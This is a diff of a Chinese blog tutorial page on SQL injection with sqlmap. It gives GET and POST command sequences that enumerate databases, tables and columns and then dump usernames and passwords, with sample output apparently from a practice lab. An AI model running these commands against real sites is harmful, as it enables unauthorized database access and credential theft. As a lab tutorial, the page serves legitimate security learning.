@@ -463,11 +463,18 @@
 <p>-u参数指定URL</p>
 <p>如果存在注入点则会爆出web容器和数据库版本信息</p>
 <p>如：</p>
-<p>web application technology: PHP 5.5.9, Apache 2.4.39<br>back-end DBMS: MySQL &gt;= 5.6</p>
+<pre><code>web application technology: PHP 5.5.9, Apache 2.4.39
+back-end DBMS: MySQL &gt;= 5.6</code></pre>
 <h4 id="②进行爆数据库"><a href="#②进行爆数据库" class="headerlink" title="②进行爆数据库"></a>②进行爆数据库</h4><p>python sqlmap.py -u “URL/?参数” –dbs</p>
 <p>-dbs读取数据库</p>
 <p>如：</p>
-<p>available databases [6]:<br>[<em>] challenges<br>[</em>] information_schema<br>[*] mysql<br>[*] performance_schema<br>[*] security<br>[*] sys</p>
+<pre><code>available databases [6]:
+[*] challenges
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] security
+[*] sys</code></pre>
 <p>python sqlmap.py -u “URL/?参数” –current -db</p>
 <p>–current-db参数列出当前应用程序所使用的数据库</p>
 <p>如：</p>
@@ -475,17 +482,105 @@
 <h4 id="③爆表名"><a href="#③爆表名" class="headerlink" title="③爆表名"></a>③爆表名</h4><p>python sqlmap.py -u “URL/?参数” –tables -D “security”</p>
 <p>-D参数指定数据库</p>
 <p>如：</p>
-<p>Database: security<br>[4 tables]<br>+———-+<br>| emails   |<br>| referers |<br>| uagents  |<br>| users    |<br>+———-+</p>
+<pre><code>Database: security
+[4 tables]
++----------+
+| emails   |
+| referers |
+| uagents  |
+| users    |
++----------+</code></pre>
 <h4 id="④爆字段名"><a href="#④爆字段名" class="headerlink" title="④爆字段名"></a>④爆字段名</h4><p>python sqlmap.py -u “URL/?参数” –columns -T “users” -D “security”</p>
 <p>-T参数指定表名</p>
 <p>如：</p>
-<p>Database: security<br>Table: users<br>[3 columns]<br>+———-+————-+<br>| Column   | Type        |<br>+———-+————-+<br>| id       | int(3)      |<br>| password | varchar(20) |<br>| username | varchar(20) |<br>+———-+————-+</p>
+<pre><code>Database: security
+Table: users
+[3 columns]
++----------+-------------+
+| Column   | Type        |
++----------+-------------+
+| id       | int(3)      |
+| password | varchar(20) |
+| username | varchar(20) |
++----------+-------------+</code></pre>
 <h4 id="⑤爆数据"><a href="#⑤爆数据" class="headerlink" title="⑤爆数据"></a>⑤爆数据</h4><p>python sqlmap.py -u “URL/?参数” –dump -C “id,username,password” -T “users” -D “security”</p>
 <p>–dump 参数意为转存数据</p>
 <p>-C参数指定字段名</p>
 <p>如：</p>
-<p>Database: security<br>Table: users<br>[13 entries]<br>+—-+———-+————+<br>| id | username | password   |<br>+—-+———-+————+<br>| 1  | Dumb     | Dumb       |<br>| 2  | Angelina | I-kill-you |<br>| 3  | Dummy    | p@ssword   |<br>| 4  | secure   | crappy     |<br>| 5  | stupid   | stupidity  |<br>| 6  | superman | genious    |<br>| 7  | batman   | mob!le     |<br>| 8  | admin    | chen       |<br>| 9  | admin1   | admin1     |<br>| 10 | admin2   | admin2     |<br>| 11 | admin3   | admin3     |<br>| 12 | dhakkan  | dumbo      |<br>| 14 | admin4   | admin4     |<br>+—-+———-+————+</p>
-<h3 id="2-POST注入"><a href="#2-POST注入" class="headerlink" title="2.POST注入"></a>2.POST注入</h3>
+<pre><code>Database: security
+Table: users
+[13 entries]
++----+----------+------------+
+| id | username | password   |
++----+----------+------------+
+| 1  | Dumb     | Dumb       |
+| 2  | Angelina | I-kill-you |
+| 3  | Dummy    | p@ssword   |
+| 4  | secure   | crappy     |
+| 5  | stupid   | stupidity  |
+| 6  | superman | genious    |
+| 7  | batman   | mob!le     |
+| 8  | admin    | chen       |
+| 9  | admin1   | admin1     |
+| 10 | admin2   | admin2     |
+| 11 | admin3   | admin3     |
+| 12 | dhakkan  | dumbo      |
+| 14 | admin4   | admin4     |
++----+----------+------------+</code></pre>
+<h3 id="2-POST注入"><a href="#2-POST注入" class="headerlink" title="2.POST注入"></a>2.POST注入</h3><h4 id="①判断是否存在注入点-1"><a href="#①判断是否存在注入点-1" class="headerlink" title="①判断是否存在注入点"></a>①判断是否存在注入点</h4><p>python sqlmap.py -u “URL” –data “POST 参数”</p>
+<p>如：python sqlmap.py -u “URL” –data “uname=admin&amp;passwd=admin&amp;submit=Submit”</p>
+<p>存在注入点会爆出web容器和数据库版本信息</p>
+<p>如：</p>
+<pre><code>web application technology: PHP 5.5.9, Apache 2.4.39
+back-end DBMS: MySQL &gt;= 5.0.0</code></pre>
+<h4 id="②爆当前数据库名"><a href="#②爆当前数据库名" class="headerlink" title="②爆当前数据库名"></a>②爆当前数据库名</h4><p>python sqlmap.py -u “URL” –current -db –data “uname=admin&amp;passwd=admin&amp;submit=Submit”</p>
+<p>如：</p>
+<p>current database: ‘security’</p>
+<h4 id="③爆表名-1"><a href="#③爆表名-1" class="headerlink" title="③爆表名"></a>③爆表名</h4><p>python sqlmap.py -u “URL” –tables -D “security” -data “uname=admin&amp;passwd=admin&amp;submit=Submit”</p>
+<p>如：</p>
+<pre><code>Database: security
+[4 tables]
++----------+
+| emails   |
+| referers |
+| uagents  |
+| users    |
++----------+</code></pre>
+<h4 id="④爆字段名-1"><a href="#④爆字段名-1" class="headerlink" title="④爆字段名"></a>④爆字段名</h4><p>python sqlmap.py -u “URL” –columns -T “users” -D “security” -data “uname=admin&amp;passwd=admin&amp;submit=Submit”</p>
+<p>如：</p>
+<pre><code>Database: security
+Table: users
+[3 columns]
++----------+-------------+
+| Column   | Type        |
++----------+-------------+
+| id       | int(3)      |
+| password | varchar(20) |
+| username | varchar(20) |
++----------+-------------+</code></pre>
+<h4 id="⑤爆数据-1"><a href="#⑤爆数据-1" class="headerlink" title="⑤爆数据"></a>⑤爆数据</h4><p>python sqlmap.py -u “URL” –dump -C “id,username,password” -T “users” -D “security” -data “uname=admin&amp;passwd=admin&amp;submit=Submit”</p>
+<p>如：</p>
+<pre><code>Database: security
+Table: users
+[13 entries]
++----+----------+------------+
+| id | username | password   |
++----+----------+------------+
+| 1  | Dumb     | Dumb       |
+| 2  | Angelina | I-kill-you |
+| 3  | Dummy    | p@ssword   |
+| 4  | secure   | crappy     |
+| 5  | stupid   | stupidity  |
+| 6  | superman | genious    |
+| 7  | batman   | mob!le     |
+| 8  | admin    | admin      |
+| 9  | admin1   | admin1     |
+| 10 | admin2   | admin2     |
+| 11 | admin3   | admin3     |
+| 12 | dhakkan  | dumbo      |
+| 14 | admin4   | admin4     |
++----+----------+------------+</code></pre>
+<h3 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h3>
             </div>
             <hr/>
 
